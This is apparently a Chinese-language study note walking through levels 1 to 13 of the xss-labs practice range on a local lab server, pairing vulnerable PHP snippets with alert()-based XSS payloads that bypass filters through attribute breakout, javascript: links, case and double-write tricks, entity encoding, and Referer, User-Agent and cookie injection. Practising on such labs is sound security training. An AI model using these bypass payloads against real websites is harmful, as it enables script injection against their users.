---
{"dg-publish":true,"title":"自建环境_xss-labs","dg-path":"安全/靶场/自建环境_xss-labs.md","permalink":"/安全/靶场/自建环境_xss-labs/","dgPassFrontmatter":true}
---


# Level 1



函数源代码：
```php
<?php
ini_set("display_errors", 0);
$str = $_GET["name"];
echo "<h2 align=center>欢迎用户".$str."</h2>";
?>
```

这一关没有什么过滤，它会将我们的name值在网页中输出，所以我们尝试注入：
```
<script>alert(1)</script>
```



# Level 2

![Pasted image 20240826195628.png](/img/user/picture/Pasted%20image%2020240826195628.png)
先构造一个测试payload：
```
'';!--"<XSS>=&{()}
```

ctrl+u查看源码：
![Pasted image 20240826195751.png](/img/user/picture/Pasted%20image%2020240826195751.png)

**发现标题双引号、尖括号、&符号被进行了转义**
而下面的输入框却没有过滤

函数源代码
```php
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>".'<center>
<form action=level2.php method=GET>
<input name=keyword  value="'.$str.'">
```

> [!NOTE] 注意
> `htmlspecialchars($str)` 是 PHP 中用来将字符串中的特殊字符转换为 HTML 实体的函数。
> - `&` 转换为 `&amp;`
>- `<` 转换为 `&lt;`
>- `>` 转换为 `&gt;`
>- `"` 转换为 `&quot;`
>- `'` 转换为 `&#039;`（这是在双引号内使用时）

所以我们可以尝试将输入框中的内容进行闭合
```
"><script>alert(111)</script>"<
```


# Level 3(绕过htmlspecials()函数)

![Pasted image 20240826200044.png](/img/user/picture/Pasted%20image%2020240826200044.png)

依旧用测试payload看一下
```
'';!--"<XSS>=&{()}
```
![Pasted image 20240826200114.png](/img/user/picture/Pasted%20image%2020240826200114.png)
完啦，现在输入框中的内容也被进行了转义

源代码：
```php
$str = $_GET["keyword"];
echo "<h2 align=center>没有找到和".htmlspecialchars($str)."相关的结果.</h2>"."<center>
<form action=level3.php method=GET>
<input name=keyword  value='".htmlspecialchars($str)."'>
```

由于htmlspecialchars默认配置是**不过滤单引号**的，于是想到构造单引号的payload。

```
'onmouseover='alert(1)
```
移动鼠标到输入框触发onmouseover事件，过关！


# Level 4
![Pasted image 20240826201105.png](/img/user/picture/Pasted%20image%2020240826201105.png)
先用测试代码看一下
```
'';!--"<XSS>=&{()}
```
![Pasted image 20240826201130.png](/img/user/picture/Pasted%20image%2020240826201130.png)
发现下面输入框过滤了我们的尖括号`<>`
所以我们可以调整一下第三题的payload，并且闭合双引号

```
"onmouseover='alert(1)'
```

# Level 5(绕过检测<script和on事件)
![Pasted image 20240826201331.png](/img/user/picture/Pasted%20image%2020240826201331.png)
测试payload看一下：
```
'';!--"<XSS>=&{()}
```

![Pasted image 20240826201442.png](/img/user/picture/Pasted%20image%2020240826201442.png)
发现好像啥也没少
用之前的payload测试一下：
```
"><script>alert("xss");</script>
```
![Pasted image 20240826201714.png](/img/user/picture/Pasted%20image%2020240826201714.png)

```
"onmouseover='alert(1)'
```
![Pasted image 20240826201759.png](/img/user/picture/Pasted%20image%2020240826201759.png)



这一题可以用javascript伪协议来实现
payload:
```
"><a href="javascript:alert(`xss`);">xss</a>
```



# Level 6
![Pasted image 20240826202233.png](/img/user/picture/Pasted%20image%2020240826202233.png)

还是测试一下：
```
'';!--"<XSS>=&{()}
```

![Pasted image 20240826210403.png](/img/user/picture/Pasted%20image%2020240826210403.png)


用上一关的payload试一下：
```
"><a href="javascript:alert(`xss`);">xss</a>
```
![Pasted image 20240826210514.png](/img/user/picture/Pasted%20image%2020240826210514.png)
发现href关键词也被过滤了

用另一个试一下：
```
sd"></br><img src="javascript:alert('1');">
```
![Pasted image 20240826210653.png](/img/user/picture/Pasted%20image%2020240826210653.png)
发现src关键词也被过滤了

这题可以用大小写绕过

```
"><a hRef="javascript:alert(`xss`);">xss</a>
```




# Level 7
![Pasted image 20240826210829.png](/img/user/picture/Pasted%20image%2020240826210829.png)

我们用上一关的payload试一下：
```
"><a hRef="javascript:alert(`xss`);">xss</a>
```
![Pasted image 20240826211150.png](/img/user/picture/Pasted%20image%2020240826211150.png)
发现`href`和`script`关键词没有了
我们试一下双写可不可以绕过：
```
"><a hRehReff="javascrscriptipt:alert(`xss`);">xss</a>
```
成功
![Pasted image 20240826211306.png](/img/user/picture/Pasted%20image%2020240826211306.png)


# Level 8
![Pasted image 20240826211343.png](/img/user/picture/Pasted%20image%2020240826211343.png)


![Pasted image 20240826211915.png](/img/user/picture/Pasted%20image%2020240826211915.png)
发现这里有一个超链接，我们尝试用伪协议利用一下
```
javascript:alert(`xss`);
```
![Pasted image 20240826212008.png](/img/user/picture/Pasted%20image%2020240826212008.png)
发现这里`script`关键词被屏蔽

这里可以使用ASCII进行绕过
"   &#34
t   &#116
:   &#58

```
javascrip&#116:alert(`xss`);
```

成功

# Level 9
![Pasted image 20240826212213.png](/img/user/picture/Pasted%20image%2020240826212213.png)

尝试一下测试payload：
```
'';!--"<XSS>=&{()}
```
![Pasted image 20240826212448.png](/img/user/picture/Pasted%20image%2020240826212448.png)
注意这种上面双引号是没有办法闭合的，所以不太可能可以绕过htmlspecials()

我们再测试几个输入，看看什么是合法的
![Pasted image 20240826212753.png](/img/user/picture/Pasted%20image%2020240826212753.png)
![Pasted image 20240826212802.png](/img/user/picture/Pasted%20image%2020240826212802.png)
好吧，要有关键词`http://`

我们修改一下上一关payload：
```
javascrip&#116:alert(`http://`);
```

成功


# Level 10

![Pasted image 20240826212935.png](/img/user/picture/Pasted%20image%2020240826212935.png)


利用测试payload试一下：
![Pasted image 20240826213839.png](/img/user/picture/Pasted%20image%2020240826213839.png)

应该是对下一个双引号做了编码，且对尖括号做了转译，而&{()}被删除了，也就是不允许做实体编码了。
但是很奇怪的是，网页源码和之前的相比，多了下面这三行：
```php
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="" type="hidden">
```
有三个输入框？为什么type为hidden？hidden 的意思为定义隐藏的输入字段。尝试使用firebug将hidden全改成submit。出现一个按钮，点击发现URL变成
```
http://10.10.10.135/xss/level10.php?t_link=&t_history=&t_sort=
```


尝试构造xss语句：
```
http://10.10.10.135/xss/level10.php?t_link=1&t_history=2&t_sort=3
```

查看网页源代码：
```
<input name="t_link"  value="" type="hidden">
<input name="t_history"  value="" type="hidden">
<input name="t_sort"  value="3" type="hidden">
```

发现只有t_sort参数才有返回数据。

```
?t_sort=3"onmouseover='alert(1)' type="text"
```

# Level 11
![Pasted image 20240827110628.png](/img/user/picture/Pasted%20image%2020240827110628.png)

用上一关的payload试一下：
![Pasted image 20240827112205.png](/img/user/picture/Pasted%20image%2020240827112205.png)
发现t_sort中的值也被实体化了
但是这一题多了一个t_ref值
```html
<input name="t_ref" value="" type="hidden">
```

这个将他改为submit后，会将当前的url值提交

![Pasted image 20240827193932.png](/img/user/picture/Pasted%20image%2020240827193932.png)

所以我们可以尝试在这里进行XSS注入
浏览器对传入的信息进行了url编码，所以要直接在数据包中进行修改
![Pasted image 20240827194316.png](/img/user/picture/Pasted%20image%2020240827194316.png)

![Pasted image 20240827194938.png](/img/user/picture/Pasted%20image%2020240827194938.png)
也就是将http头中referer中的`%22`替换为双引号,`%27`替换为单引号


# Level 12



![Pasted image 20240827195155.png](/img/user/picture/Pasted%20image%2020240827195155.png)
![Pasted image 20240827195144.png](/img/user/picture/Pasted%20image%2020240827195144.png)
这题看样子就是将我们的UA头进行了保存
所以说我们在UA头加入如下payload即可
```
"onmouseover='alert(1)' type="text"
```



# Level 13
![Pasted image 20240827200205.png](/img/user/picture/Pasted%20image%2020240827200205.png)
![Pasted image 20240827200424.png](/img/user/picture/Pasted%20image%2020240827200424.png)
这里有一个`t_cook`，应该就是cookie

所以我们直接抓包在cookie中加入payload即可
![Pasted image 20240827200609.png](/img/user/picture/Pasted%20image%2020240827200609.png)
```
"onmouseover='alert(1)' type="text"
```


# 后面难度太大了，日后再做










